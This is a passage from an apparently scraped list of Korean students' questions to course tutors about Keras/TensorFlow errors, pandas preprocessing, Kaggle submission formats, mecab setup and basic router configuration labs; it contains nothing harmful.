'https://drive.google.com/file/d/1heAHTQOmJDn93SSSVS5JA1MWiUWbFaIU/view?usp=sharing\\n\\ncheckpoint에서 filepath를 어떻게 지정해야 할지 몰라\\n임의로 폴더를 만들어서 지정했는데 이렇게 하니 에러가 뜨는 것 같아요..\\n모델링 하고 나온 ckpt?파일을 입력해줘야 하나요?\\n그건 어느 경로에 저장되는지 알 수 있을까요?',\n","       \"model.fit 시 error 발생합니다.\\n\\n# 모델 학습\\nhistory = model.fit( \\n    train_generator,\\n    validation_data = validation_generator, \\n    epochs=10,\\n    verbose=1\\n)\\n\\nNotFoundError: Graph execution error:\\nNode: 'sequential/conv2d/Conv2D'\\nNo algorithm worked!  Error messages:\\n\\t [[{{node sequential/conv2d/Conv2D}}]] [Op:__inference_train_function_849]\",\n","       'Kaggle 대회는 조별이 아닌 개인 단위에서 실시되는 건가요?\\n\\n그러면 이번 미니프로젝트 3차는 4일차부터 조별모임이 시작되는 거죠?',\n","       'model.add( Conv2D(filters = 8, kernel_size = (3,3), padding = \\'same\\', strides = (1,1), activation = \\'relu\\', input_shape = (480, 854))) \\n로 입력을 주었을 때, \\nInput 0 of layer \"conv2d\" is incompatible with the layer: expected min_ndim=4, found ndim=3. Full shape received: (None, 480, 854)\\n로 오류가 출력됩니다. ',\n","       '모델 fit 하는 과정에 오류 확인부탁드립니다ㅠㅠ',\n","       '구글링 해본 결과 프롬프트가 아닌 파이썬에서 텐서플로우를 바로 설치하는 구문이\\n\\npip3 install --upgrade pip\\npip3 install tensorflow\\n\\n이 둘을 이용하는 방법인데, 저는 업그레이드부터 invalid syntax오류가 발생하여 다른 방법이 있는지, 프롬프트를 이용하여 설치해야 하는지 질문합니다.\\n\\n항상 감사합니다!',\n","       'flow_from_directory 함수 사용시 train과 validation의 경우 경로에서 4개의 파일로 나누어서 진행해서 class mode를 categorical로 두고 했는데 test의 경우 image 폴더 하나에 다 들어가 있으므로 binary로 하는건가요? 폴더 개수와 상관없이 그대로 categorical로 지정하나요?',\n","       '오류 내용이 넘파이 배열을 넣어라 하는거 같은데... 어떤 조치를 해야할지 감이 안잡혀요...ㅠㅠ\\n오류 메시지 : `validation_split` is only supported for Tensors or NumPy arrays, found following types in the input: []\\n\\n(수정) fit이미지의 checkpoint와 early_stopping 사이에 있는코드는 삭제하였습니다. -\u0026gt; 증상 같음',\n","       'train_datagen = ImageDataGenerator(\\n    rescale=1. / 255,  # 이미지 데이터 정규화\\n    validation_split=0.2, # train, validation 데이터 분할 (8:2)\\n)\\n\\n# genrator를 위한 변수 생성\\nbatch_size = 16\\nimg_height = 480\\nimg_width = 854\\n\\n# train_genrator 생성\\ntrain_generator = train_datagen.flow_from_directory(\\n    TRAIN_PATH,\\n    batch_size=batch_size,\\n    shuffle=True,\\n    #color_mode=\"grayscale\",\\n    target_size=(img_height, img_width),    \\n    class_mode=\\'categorical\\',\\n    subset=\\'training\\'\\n)\\n\\n# validation_generator 생성\\nvalidation_generator = train_datagen.flow_from_directory(\\n    TRAIN_PATH,\\n    target_size=(img_height, img_width),\\n    batch_size=batch_size,\\n    class_mode=\\'categorical\\',\\n    subset=\\'validation\\'\\n)\\n\\n# 모델 컴파일 \\nmodel.compile(loss=\\'categorical_crossentropy\\', metrics=[\\'accuracy\\'],\\n              optimizer=\\'adam\\')\\n\\n# checkpoint\\ncheckpoint = ModelCheckpoint(MODEL_PATH,           # file명을 지정합니다\\n                             monitor=\\'val_loss\\',   # val_loss 값이 개선되었을때 호출됩니다\\n                             verbose=1,            # 로그를 출력합니다\\n                             save_best_only=True,  # 가장 best 값만 저장합니다\\n                             mode=\\'auto\\'           # auto는 알아서 best를 찾습니다. min/max\\n                            )\\n\\n# early_stopping\\nearly_stopping = EarlyStopping(monitor=\\'val_loss\\',         # 관측 대상\\n                                min_delta=0,               # 개선이라고 인정하기 위한 최소한의 값\\n                                patience=4,                # 개선되지 않을 때, 몇 번이나 참을 것인지\\n                                verbose=1,\\n                                restore_best_weights=True) # 최적의 가중치를 모델에 전달\\n\\n# 모델 학습 (문제가 되는 코드!!!)\\nhistory = model.fit(\\n        train_generator,\\n        steps_per_epoch=12,\\n        epochs=10,\\n        validation_data=validation_generator,\\n        validation_steps=3,\\n        callbacks = [checkpoint, early_stopping])\\n\\n##### 에러 메시지 #####\\nEpoch 1/10\\n---------------------------------------------------------------------------\\nNotFoundError                             Traceback (most recent call last)\\n in \\n      9         validation_data=validation_generator,\\n     10         validation_steps=4,\\n---\u0026gt; 11         callbacks = [checkpoint, early_stopping])\\n     12 \\n     13 # STEP_SIZE_TRAIN=train_generator.n//train_generator.batch_size\\n\\n1 frames\\n/usr/local/lib/python3.7/dist-packages/tensorflow/python/eager/execute.py in quick_execute(op_name, num_outputs, inputs, attrs, ctx, name)\\n     53     ctx.ensure_initialized()\\n     54     tensors = pywrap_tfe.TFE_Py_Execute(ctx._handle, device_name, op_name,\\n---\u0026gt; 55                                         inputs, attrs, num_outputs)\\n     56   except core._NotOkStatusException as e:\\n     57     if name is not None:\\n\\nNotFoundError: Graph execution error:\\n\\n모델 학습 코드에 문제가 생겼는데 도무지 이유를 모르겠습니다ㅠㅠ.\\n혹시 몰라 앞에 썼던 다른 코드들도 같이 올립니다.',\n","       '모델 예측 부분인\\npredict_df = my_model_predict(test_generator, MODEL_PATH)에서 \\n\\nFailed to find data adapter that can handle input: , \\n\\n라는 오류가 뜨는데 혹시 이 부분은 모델을 다시 fit 해야 해결되는 문제일까요? ',\n","       'x.shape가 이러한 값으로 나오는게 맞을까요 ..? 만약 맞다면 input에는 어떠한 값으로 입력해야 하는지 궁금합니다. ',\n","       'train_generator, validation_generator 데이터에서 사용한 batch_size를 말하는 건가요?\\n이거 아무리 줄여봐도 같은 오류 메시지가 나옵니다ㅠㅠ',\n","       'h = data1.loc[x_test.index ]\\nh[\\'Result_v1\\']= y_pred\\nh.head() \\n이런코드를 썼는데\\n\\n\\n\"Passing list-likes to .loc or [] with any missing labels is no longer supported. The following labels were missing: Int64Index([2730, 2789, 3082, 3555, 3640,\\\\n            ...\\\\n            2941, 2549, 2880, 2526, 2464],\\\\n 이런에러가 나왔습니다.',\n","       '  ValueError: Shapes (None, None) and (None, 8, 48, 976) are incompatible\\n이러한 오류가 발생하는데 원인이 잘 모르겠습니다, ㅜㅜ\\n\\n그리고 study 3 AI모델링에서 모델 학습을 하면 \\nValueError: `y` argument is not supported when using `keras.utils.Sequence` as input.\\n이러한 오류도 발생합니다...',\n","       'checkpoint = ModelCheckpoint(monitor = \"val_loss\",\\n                             filepath = MODEL_PATH,\\n                             save_best_only= True,\\n                             verbose = 1)                       \\n____________________________________________________________________\\n\\n위의 코드를 모델 생성시에 callback 함수로 실행하여 모델을 저장하였습니다. \\n\\nmodel 폴더를 확인하니 설명과 다르게  .h5파일이 없고 .pb파일이 있는데\\n제가 뭔가 잘못한게 있을까요?\\n\\n답변 부탁드립니다. 감사합니다.',\n","       '모델에 test데이터 (df)로 예측합니다.\\n\\ntest_z = df\\ny_pred = model.predict(test_z)\\n를 실행했을 때 첨부파일과 같은 오류가 나타납니다.',\n","       'csv 파일을 제출해봤는데 0점으로 떠서요.\\n혹시 제출 양식이 잘못된건지 확인해주실 수 있을까요 ?ㅠㅠ',\n","       \"predict 함수를 정의하고 사용하는데 계속 'float' object cannot be interpreted as an integer 라는 에러가 뜹니다. 찾아봐도 무엇이 문제인지 몰라서 문의 드립니다...\",\n","       'test_generator의 target_size를 float 형태로 입력해서 에러가 발생했던 것 같습니다.  여러 방법 시도해보다가 이 부분 고치니 에러가 없어졌습니다. 답변 주셔서 도움이 됐습니다. 감사합니다! ㅎㅎ',\n","       '수업내 배운건 아니지만 opencv의 소벨필터(첨부파일 중간,우)는 데이터의 불필요한 정보를 줄이기 강조하기 위한 필터로 알고 있습니다. 필터를 통해 최대한 특징(선)을 살렸지만 필터를 적용하면 기존 학습데이터와는 다르게 검은 배경이 기본으로 바뀌어 이것을 컬러 이미지 데이터와 학습을 같이하는 사례를 찾을 수 없었고  이 필터 데이터와 컬러 데이터가 같이 학습할 수 있는지 또 효과가 있는지 궁금합니다.',\n","       \"ERROR: Unexpected Column:  'PK?????!i?�)�?�????[Content_Types].xml �??(�?...' (Line 1, Column 1)\\nERROR: Required column 'id' could not be found\\nERROR: Required column 'expected' could not be found\\n\\n이 경우 업로드 하지 않은 것으로 간주하여 0점 처리됩니까?\\n\\n만약 그렇다면 어떤 점을 수정해야 하는지 알려주시길 바랍니다.\",\n","       'ai모델링 작업 한 후 파일 업로드 했더니 오류가 떴습니다,, \\ncolumn 처리를 어떻게 해야하는건가요?',\n","       \"어떻게 캐글 제출양식과 동일하게 만들수 있나요.? ㅠㅠ\\n도움 주시면 감사하겠습니다.. \\n\\n그리고\\ntest = pd.read_csv('test_dataset_v01.csv')\\nmodel_pred =model.predict(test)\\n\\n돌렸더니\\n\\n    148     # for object dtype data, we only check for NaNs (GH-13254)\\n\\nValueError: Input X contains NaN.\\n\\n결측치가 있다고 오류가 뜨는데,, 결측치 다 제거했는데 오류가 뜹니다ㅜ\",\n","       '현재 캐글 상위권 발표자 분들 대부분이 test데이터셋의 결측치를 test데이터의 통계값으로 채우셨는데(knn imputer) 이러한 방법이 data leakage가 아닌 지에 대해 궁금하여 문의를 드립니다',\n","       'train 데이터의 칼럼 수와 test 데이터의 칼럼 수는 같아야 하나요? \\n- 전처리를 진행해도 test 데이터를 나중에 봤을 때, 결측치가 있는 경우에 열을 지우게 되는데 그럼 test 데이터의 전처리에 맞춰서 train 데이터를 다시 수정하고, 모델링을 진행하나요?',\n","       '모델 학습을 돌리면\\nWARNING:tensorflow:Early stopping conditioned on metric `val_loss` which is not available.\\n\\nAvailable metrics are: loss,accuracy\\n\\nWARNING:tensorflow:Can save best model only with val_loss available, skipping.\\n이러한 오류가 뜨긴 하지만 돌아갑니다.\\n그래도 괜찮은지 궁금해서 문의 드립니다.\\n\\n코랩 주소 입니다.!\\nhttps://drive.google.com/file/d/1cPwbyAytl9oLKh3pYWz0lxBEiLbGpmp_/view?usp=sharing',\n","       '오늘 과제 제출 정보가 없어서 여쭤봅니다. 오늘은 개인 실습은 실습만 하고 제출 하는 건 따로 없고, 내일 팀 제출만 있는 게 맞을까요?',\n","       '강의장 소리가 안 나와서 나갔다 들어가려는데 저렇게 뜨고 안들어가집니다 ㅠㅠ 어떻게 하죠?',\n","       '채팅은 뜨는데 영상이 안 보입니다',\n","       '저 튕겨서 쉬는시간 이후부터 강의를 못 들었는데 \\nAIDU 접속 이후부터 어떻게 진행하는지 알려주세요 ㅠㅠ \\n주피터랩까지 어떻게 가는건가요?',\n","       '지금 강의에서 쓰는 파일 위치좀 알려주세요...\\n전혀 못 따라가고 있어요 ㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠ',\n","       '머신러닝과 딥러닝은 하나만 선택해서 하는게 아니고\\n둘다 같이 해야 하는걸까요..?\\n프로젝트시에도 딥러닝이 더 좋은건줄 알고 딥러닝만 시도했었는데요 \\n발표를 들어보니 전부다 하시는 것 같아서요!\\n두가지가 서로 다른 목적?이나 방향이 다른건지요',\n","       '다시 실행 했는데도 스프레드 권한이 없다고 뜹니다...\\n어떻게 해야 되나요ㅠㅠ', '쥬피터가 안들어가집니다',\n","       '제 아이디를 엑셀 파일에 검색해도 안 떠요\\n드래곤볼 사진까지 제출 했는데요',\n","       \"[Errno 2] No such file or directory: 'onenavi_train.csv'\",\n","       '제가 늦게 와서 데이터를 받지 못하였는데 공유 받고 싶습니다.',\n","       '해당 문제를 어떻게 풀어야 할지 모르겠는데 도움을 받을 수 있을까요?\\ndf_total에 object형태가 절반인데...',\n","       '이친구들은 어떻게 제거할 수 있을까요...ㅠㅠ\\n보시는 대로 drop을 쓰면 오류만 납니다 ㅠㅠㅠㅠ',\n","       \"ET가 15000인 데이터를 제거하라는 것은 해당 행을 삭제하는 것인가요?\\n\\noutlier = df_total['ET']\u0026gt;15000.0\\ndf_total.drop(outlier, axis=0, inplace=True)\\n이런식으로해도 오류가 나는데 어떻게 해야될까요?\\n\\n조건을 주는게 말이 안되나 싶기도 하고..\",\n","       '1.  sns.heatmap(df_total) 에서\\n\\ncould not convert string to float 라는 문자열 존재로 인한 오류가 나왔는데, 이런 경우 값이 문자인 열은 삭제한 후에 heatmap을 해줘야 할까요?',\n","       \"df_total = df_total.loc[df_total['level1_pnu'] ==['경기도', '서울특별시', '인천광역시'],:]\\n\\n위 코드를 통해서  수도권 데이터만 뽑으려고 하였는데\\n('Lengths must match to compare', (109273,), (3,)) 라는 에러 메세지가 뜹니다.\\n어떻게 하면 좋을까요?\",\n","       '저장할 때 파라미터를 지정하지 말라는 이야기가 앞서 실행할때 돌렸던 모델에서 파라미터를 제거하고 다시 모델링해서 저장하라는 의미인가요??',\n","       \"[실습문제7] 데이터 스케일링\\ndf_total을 MinMaxScaler로 데이터 스케일링을 진행하고 feature 변수로 저장해주세요.\\n\\n1.스케일링 이후에 데이터 분리를 위해서 df_total의 'DAY'만 data_day로 저장해주세요.\\n2.'df_total'변수에서 학습에 활용하지 않을 'RID', 'TIME_DEPARTUREDATE', 'TIME_ARRIVEDATE', 'ET', 'ETAA', 'PerHour', 'DAY'는 제거하고 'scale_data'에 저장해주세요.\\n3.스케일링을 하면 결과가 numpy 배열로 나옵니다. 이를 데이터 프레임으로 변경하면 Column 명을 확인할 수 없는데요. 이를 위해서 'scale_data'의 컬럼명을 'columnNames'에 별도로 저장해두세요.\\n4.'scale_data'를 (0과 1 사이)MinMaxScaler로 스케일링 하고 각각 'feature' 변수로 DataFrame으로 변경 후 저장해주세요.\\n5.'feature'의 컬럼명을 'columnNames'으로 지정해주세요.\\n6.'feature'에 'DAY' 컬럼으로 data_day을 추가해주세요.\\n7.'feature'(~24일)는 'train_feature'변수로 'feature'(27일~)는 'evaluation_feature' 변수로 분리 해주세요.\\n8.'train_feature'와 'evaluation_feature' 변수의 'DAY' 컬럼을 제거해주세요.\\n\\n\\n\\n문제에 대해서 \\n\\nfrom sklearn.preprocessing import MinMaxScaler\\nscaler = MinMaxScaler()\\nfeature = scaler.fit_transform(df_total)\\ndata_day = df_total.drop('DAY', axis=1)\\nscale_data = df_total.drop(['RID', 'TIME_DEPARTUREDATE', 'TIME_ARRIVEDATE', 'ET', 'ETAA', 'PerHour', 'DAY'], axis = 1)\\ncolumnNames = list(scale_data)\\n= pd.DataFrame\\n\\n이렇게 3번까지 진행했는데 전체적인 흐름을 못찾고 헤매고있는거 같습니다 \\n우선 4번 'scale_data'를 (0과 1 사이)MinMaxScaler로 스케일링 하고 각각 'feature' 변수로 DataFrame으로 변경 후 저장해주세요.\\n\\n이 무슨말인지 잘 이해가 안갑니다\",\n","       'numpy 배열의 인덱스에 지원하지 않는 타입이라고 하셨는데요,\\n그러면 저거는 어떻게 해야 수정해야 하는 걸까요...?\\n방법을 모르겠어서 30분동안 헤매다가 일단 3번으로 넘어가긴 했는데 너무 궁금합니다.ㅠ',\n","       \"3. 데이터 전처리 실습문제7에서 4번('scale_data'를 (0과 1 사이)MinMaxScaler로 스케일링 하고 각각 'feature' 변수로 DataFrame으로 변경 후 저장해주세요.)는\\n\\nscale_data = scaler.firt_transform(scale_data) 이걸 의미하는 게 맞을까요?\\n\\n항상 감사합니다.\",\n","       'feature importance 는 어떻게 구하나요?',\n","       '# train 셋으로 fitting \u0026 적용\\nx_train = scaler.fit_transform(x_train)\\n\\n# validation 셋은 적용만!\\nx_val = scaler.transform(x_val)\\n\\n\\n1. 딥러닝 전처리 단계에서 이렇게 train쪽은 fit_transform을 하고 valdiation쪽은 transform만 하는 이유가 무었인가요? \\n\\n2. 둘은 무슨차이가 있나요?',\n","       '크롭 시키는 코드에서 오류가 발생했는데 도저히 해결이 안되서 문의드립니다\\n',\n","       \"히트맵을 불러오면 \\nsns.heatmap(df이름) 으로 하는데\\nRID 때문에 안된다는 것 같은데 (could not convert string to float: 'router-84875df7fc-b5nxc-2-2300503-0')\\n어떻게 해야되나요..?\\n\\n위에서 merge를 할때\\n# csv 불러오고\\ndf_pnu = pd.read_csv('raw_data/onenavi_pnu.csv', sep='|')\\ndf_signal = pd.read_csv('raw_data/onenavi_signal.csv', sep='|')\\n# merge\\ndf_total = pd.merge(df_total, df_signal, on='RID', how='outer')\\ndf_total = pd.merge(df_pnu, df_total, on='RID', how='outer')\\n\\n이렇게 했는데 혹시 틀린 부분이 있을까요?\\n\\n혹은 위에서 concat을 쓸 때 join 조건을 inner라고 해야되나요??\\ndf_total = pd.concat([df, df_evl], join='outer', axis=0)\",\n","       \"안녕하세요? 딥러닝시 아래와 같은 오류가 뜹니다. 무엇이 문제일까요?\\n/usr/local/lib/python3.6/dist-packages/keras/callbacks/callbacks.py:846: RuntimeWarning: Early stopping conditioned on metric `val_loss` which is not available. Available metrics are: loss,mae,mse\\n  (self.monitor, ','.join(list(logs.keys()))), RuntimeWarning\\n---------------------------------------------------------------------------\\nKeyError                                  Traceback (most recent call last)\\n in \\n     14 model.compile(optimizer = 'adam' , loss = 'mse' ,metrics = ['mae','mse'])\\n     15 \\n---\u0026gt; 16 hist = model.fit(train_x, train_y,callbacks = [ES,MC])\\n\\n/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/engine/training.py in fit(self, x, y, batch_size, epochs, verbose, callbacks, validation_split, validation_data, shuffle, class_weight, sample_weight, initial_epoch, steps_per_epoch, validation_steps, validation_batch_size, validation_freq, max_queue_size, workers, use_multiprocessing)\\n   1143           epoch_logs.update(val_logs)\\n   1144 \\n-\u0026gt; 1145         callbacks.on_epoch_end(epoch, epoch_logs)\\n   1146         training_logs = epoch_logs\\n   1147         if self.stop_training:\\n\\n/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/callbacks.py in on_epoch_end(self, epoch, logs)\\n    430         if numpy_logs is None:  # Only convert once.\\n    431           numpy_logs = tf_utils.to_numpy_or_python_type(logs)\\n--\u0026gt; 432         callback.on_epoch_end(epoch, numpy_logs)\\n    433 \\n    434   def on_train_batch_begin(self, batch, logs=None):\\n\\n/usr/local/lib/python3.6/dist-packages/keras/callbacks/callbacks.py in on_epoch_end(self, epoch, logs)\\n    700         if self.epochs_since_last_save \u0026gt;= self.period:\\n    701             self.epochs_since_last_save = 0\\n--\u0026gt; 702             filepath = self.filepath.format(epoch=epoch + 1, **logs)\\n    703             if self.save_best_only:\\n    704                 current = logs.get(self.monitor)\\n\\nKeyError: 'val_loss'\",\n","       '친애하는 튜터님들 안녕하십니까......\\n\\n미천한 제가 저장하는 부분에 대한 개념이 부족한 것 같습니다 ㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠㅠ\\n\\n\\nModelCheckPoint, EarlyStopping도 구글링 복붙했을 뿐 이해가 잘 되지 않았습니다...\\n튜터님의 ModelCheckPoint, EarlyStopping, 저장에 대한 개념 설명과 오류에 대한 설명을 좀 배우고 싶습니다.!',\n","       '원격 연결이 중단된건가요..?', '완성된 ppt를 제출하려하는데 아래처럼 에러가 발생합니다!',\n","       \"6번 파일 제출에 문제가 있습니다.\\nXGBoostError: need to call fit or load_model beforehand\\n\\n위와 같은 오류가 계속 발생하는데요\\n\\nmodel_xg = XGBRegressor(n_estimators= 130,\\n                      gamma= 1,\\n                      eta= 0.1,\\n                      max_depth= 8,\\n                      reg_lambda= 5,\\n                      reg_alpha= 5,\\n                      random_state= 42,\\n                      objective= 'reg:squarederror')\\n\\nmodel_xg.fit(train_x, train_y)\\n\\npred = model_xg.predict(test_x)\\nr2_score(test_y, pred)\\n\\nimport joblib\\njoblib.dump(model_xg, 'model/4_model.pkl')\\n\\n다른 사람들의 코드와 비교해봐도 차이점을 알 수 없어 질문드립니다.\",\n","       '왜 계속 aihub에 있는 데이터가 변화하는 걸까요??', '쥬피터 랩 실행이 안되서 원격 요청드립니다.!',\n","       '실습별로 행성이름의 도장을 찍어서 qr코드 찍으면 표로 볼수있던데, 빠짐없이 다 한것같은데 2,3번째 도장이 안찍혀있네요. 해당 강사님께 이메일을 보내야되나요?',\n","       '문의내용 답장 내용은 다음과 같은데 혹시 언제 날짜인지 알려주실수있을까요??\\n\\n안녕하세요, 에이블러님\\n\\n해당 미니 프로젝트 2, 3차는 셀프 테스트를 전부 맞히셔야\\n\\n행성 도장을 받으실 수 있습니다. 셀프 테스트 결과를 확인해보시기 바랍니다.\\n\\n감사합니다.',\n","       '평소 데이터를 다룰때  성능튜닝시\\nmax_depth : range(1,21) 일때 range범위를 어떤 기준으로 설정해야할까요??\\n\\ncv갯수도 어떤 기준으로 몇개로 설정해야할까요?',\n","       '아직 실습 진행을 끝까지 하지 못해서 데이터 원복 부탁드립니다..!',\n","       '7성구 마지막 단서 확인 부분에서 \\nException: Data must be 1-dimensional 이렇게 오류가 뜹니다 어떻게 해결하면 될까요?',\n","       '이전 실습 질문에 이어서 추가질문드립니다\\n! pip uninstall xgboost으로 지운후 xgboost 재설치후에도 오류가 발생하였으며\\ntrain_y와 target값의 columns 수는 각각 2였고 열 이름도 똑같아 차이는 없었습니다\\nDataFrame for label cannot have multiple columns 오류는 데이터 전처리부터 심화문제까지 다시 전체 코드를 한번 더 돌려야하는게 맞을까요? ',\n","       'wiki.txt 파일이 구글드라이브에 업로드 되지 않습니다. 오늘 실습에서 꼭 필요한 파일인가요?',\n","       \"!sudo make install\\n에러문구\\nmake[1]: Entering directory '/content/mecab-ko-dic-2.1.1-20180720'\\nmake[1]: Nothing to be done for 'install-exec-am'.\\n /bin/mkdir -p '/usr/local/lib/mecab/dic/mecab-ko-dic'\\n /usr/bin/install -c -m 644 model.bin matrix.bin char.bin sys.dic unk.dic left-id.def right-id.def rewrite.def pos-id.def dicrc '/usr/local/lib/mecab/dic/mecab-ko-dic'\\nmake[1]: Leaving directory '/content/mecab-ko-dic-2.1.1-20180720'\\n\\n라고 뜨고, 이후 코드 사전 추가한 부분이 반영되지 않습니다...ㅠ\",\n","       '2. 데이터 전처리 스케일링 과정과 \\n6.모델링에서 Length of values (53742) does not match length of index (53684) 오류 부분을 문의했습니다만 여전히 갈피를 못 잡고 있습니다..\\n7. 은 조원들과 같은 코드인데 저만 드래곤볼이 안 나와서 한 번 봐주시면 감사합니다.',\n","       'KNN Imputer가 결측치 있을 때만 쓰는 건 이해가 가는데요, \\n항상 스캐일링 전에 해야 하는 걸까요?? 아니면 그때 그때 다를까요..?',\n","       'vader 값의 범위가 0-~1 이 아닌가요?\\n0.5초과는 긍정\\n-0.5 미만은 부정이면\\nvader값의 범위값은 몇에서 몇인가요?',\n","       '강의 첫날 계획상으로는 10월 28일에 AIFB 시험을 응시하는것으로 확인했으나 이전 수업에 강사님께서 10월 20일에 AIFB 시험이 계획되어있다는 말씀을 해주신것으로 기억합니다. \\n정확히 AIFB 시험은 언제보는것일까요? ',\n","       'for t in model.wv.most_similar(positive=[\"앙카라\", \"네팔\"], negative=[\"카트만두\"], topn=20):\\n    print(\\'%s\\\\t%f\\' % (t[0], t[1]))\\n에서 t[0] 과 t[1] 각각 이 무엇을 의미하는지 잘모르겠용',\n","       '혼자서 이리 저리 만지다가 data파일이 손상된거 같습니다... 혹시 data 파일을 다시 받을 수 있을까요?',\n","       '서브넷 마스크와 IP는 다른건가요??\\n\\nIP는 32비트로 이루어져있고, 앞쪽은 네트워크, 뒤쪽은 호스트 주소로 구분되고\\n서브넷 마스크도 32비트로 이루어져 있는데, class C에서의 예시만 있는데 이해가 잘 안돼요\\n\\nIP와 서브넷 마스크가 서로 따로 \\nIP : 0000.0000.0000.0000\\n서브넷마스크 : 0000.0000.0000.0000\\n이렇게 존재하는 줄 알았는데 첨부된 이미지로 보면 IP내에 포함되어 있는 것처럼 보여서요',\n","       '인스턴스가 heap 메모리에 올라간다는건 토치에서 loss 나 optimize 관련된 함수를 실행하면 인스턴스가 올라간 heap 메모리의 가중치가 업데이트 된다고 생각하면 될까요?',\n","       '라우터에 모듈을 따로 드래그해서 붙여주는데\\n모듈은 그냥 하드웨어적인 포트와 비슷한 건가요? \\n그냥 연결부를 추가 설치해준건가요? \\n모듈이란게 뭔지 잘 모르겠어서 질문드립니다.',\n","       '이전과 마찬가지로 shutdown을 해도 라우터간 연결이 안되는 거 같습니다 어떻게 하면 될까요?',\n","       '3번째 라우터에 포트 이름이 시리얼이 없구 모뎀뿐인건 뭘 잘못 연결해서 그런건가요???',\n","       '1. ModuleList 코드\\nCo = 50\\nKs = [2,3,4]\\n\\nself.convs1 = nn.ModuleList([nn.Conv2d(1, Co, (K, 100)) for K in Ks])\\nself.dropout = nn.Dropout(0.2)\\n\\n2. convs 3 layer\\nself.convs1 = nn.Conv2d(1, Co, (2, 100))\\nself.dropout = nn.Dropout(0.2)\\nself.convs2 = nn.Conv2d(1, Co, (3, 100))\\nself.dropout = nn.Dropout(0.2)\\nself.convs3 = nn.Conv2d(1, Co, (4, 100))\\nself.dropout = nn.Dropout(0.2)\\n\\n1번과 2번이 어떻게 다른 건가요?\\n\\n그리고 moduleList 를 사용할때 output layer의\\nself.fc1 = nn.Linear(len(Ks)*Co, C)\\n코드의 len(Ks)*Co 이 부분도 잘 이해가 안됩니다.\\n\\n2번 코드 기준으로 하면 마지막 conv2 layer 기준으로\\nself.fc1 = nn.Linear(Co * 4 * 100,  C)의 형태로 output layer를 해주는거 같은데\\n\\n1번 코드 moduleList 를 사용하는 경우\\nself.fc1 = nn.Linear(Co * 4 * 100,  C) output layer의 in_channels 계산은 \\nout_channels에 커널 사이즈 대신 리스트 사이즈를 곱해준다고 생각해야하나요?\\n',\n","       '휴가날 셀프테스트 못치면 점수는 어떻게 반영되나요?\\n조퇴의 경우도 궁금합니다! 그냥 0점인가요? ',\n","       \"R3 라우터에서 s1/1 과 s1/0 을 같은 ip로 설정하는 바람에\\nR3(config-if) ip route 13.13.1.0 255.255.255.0 13.13.23.2\\n를 하면 \\ninvalid next hop address(it's this router )라는 오류메세지가 뜨는 것 같습니다\\n\\n해당 오류는 어떻게 해결해야 하나요\\nno ip address s1/1를 해도 제거가 되는 것 같지가 않아서 질문드립니다\",\n","       '현재 실습중인 01_Sentiment_RNN 파일에서 질문드립니다.\\ntxt.shape: torch.Size([30, 100])\\n-\u0026gt; 100이 배치 사이즈를 의미한다면, 30은 무얼 의미하나요?\\n\\npred.shape: torch.Size([100, 2])\\n-\u0026gt; 100은 배치사이즈, 2는 긍정부정의 class 2개를 의미하는게 맞나요?\\n\\nlabel.shape: torch.Size([100])\\n-\u0026gt; label은 정답값이므로, 이 역시 긍부정의 2개와 배치사이즈 100으로 이루어져야하는거 아닌가요?왜 100개만 나오는지 모르겠습니다.',\n","       '패스워드를 입력했는데 잘 안되는거 같아 문의드립니다. \\n어떤부분이 \\n잘못된거 일까요???',\n","       '가이드와 다르게 이상한 오류문구가 뜨는데 정상인가요?\\n그리고 login incorrect라고 뜨는데 잘못입력한건가요?',\n","       '저도 어댑터가 안 잡혀요 원견 부탁드려요',\n","       '이 코드에서, Co의 하이퍼파라미터가 커지고 작아짐에 따라 어떤일이 생기나요?\\nCi는 또 어떤 일이 생기는지에 대해 잘 이해를 못하겠습니다.\\n또한 D의 값에 따라 벡터의 크기를 바꿔주는게 맞나요? \\n수업은 잘 듣고있습니다만, 이해에 혼선이 생깁니다. 감사합니다.',\n","       '명령어 쓸 때는 무조건 띄어쓰기 해야 하는 걸까요...? \\n어떨 때 띄어쓰기 해야하는 건지 헷갈립니다...!',\n","       '디렉토리와 파일의 차이는 무엇인가요?\\n',\n","       '구글 드라이브 들어갔다 나왔을 뿐인데 강의 화면이 검정색으로 밖에 안 보입니다 몇 번이나 나갔다 들어왔는데도 안 보입니다',\n","       '수업을 놓쳐 미니프로젝트 파일을 놓쳤습니다ㅠㅠㅠ 혹시 어디서 볼 수 있나요?? ',\n","       'ip만 알고 있을 때 mac 주소를 확인할 수 있는 게 arp라고 하셨는데요,\\n그 반대의 경우에는 어떻게 확인할 수 있을까요...?',\n","       '사진을 보면 알듯이 text랑 label이랑 분리하여 저장후 morphs를 실행하였으나\\nphrase input should be string, not \\nstring 타입이여야한다고 오류가 발생합니다. 그냥 text 전체를 string으로 변환해서 입력하면되는 건가요?',\n","       \"text = spam1['text'].astype('string')으로 하고 print(text)를 할 경우\\ndtype: string으로 나옴에도 mecab이 작동이 안됩니다..\",\n","       \"morphs = []\\nfor i in range(len(spam)):\\n    print(mecab.morphs(spam['text'][i]))\\n    morphs.extend(mecab.morphs(spam['text'][i]))\\nprint(morphs)\\n\\n이 코드로 형태소 분석 하려고 하는데\\n잘 돌아가다가\\nKeyError 75라는게 뜨면서\\n중간부터 실행이 안됩니다 ㅜ\\n사전에 결측치 모두 제거하고 reset_index까지 돌린 상태인데\\n왜 중간에 돌아가다 멈추는지 알 수 있을까요.. \\n\\n\",\n","       '아래 코드 중간에 동작이 돌아가다 만다고 문의 드린거 위에 전처리 한 코드 전달 드립니다\\ndrop_duplicate 를 실행하지 않으면 아래 코드가 잘 돌아가는데 drop_duplicate때문에 안돌아가는것 같아요\\n어떤문제가 있어서 그런걸까요???',\n","       '네 http://localhost:8888/lab 이 주소로도 접속이 안되고 똑같은 화면이나옵니다 \\n\\n그리고 말씀해주신거 anaconda 로 uninstall 후 install해봤는데 여전히 실행이안됩니다 \\n\\n다른방법 없을까요?',\n","       '파이썬 explode 는 리스트 값을 전개하는 함수로 알고있습니다.\\n여기서 강사님이 원하시는게 어떤건 지 몰라서,,\\ntext 길이 describe()\\n각 text 의 단어 수 describe()\\n이런 분포를 의미하는 걸까요?',\n","       '실습파일 2번 Vectorize 부분에서요, x_train의 각각 행에 대해서 CountVectorizer을 적용하는건가요..? 아니면 x_train의 모든 행을 하나의 텍스트로 합친 후에 진행해야 하나요?',\n","       'Vocabulary 만들기는 명사랑 특수기호만 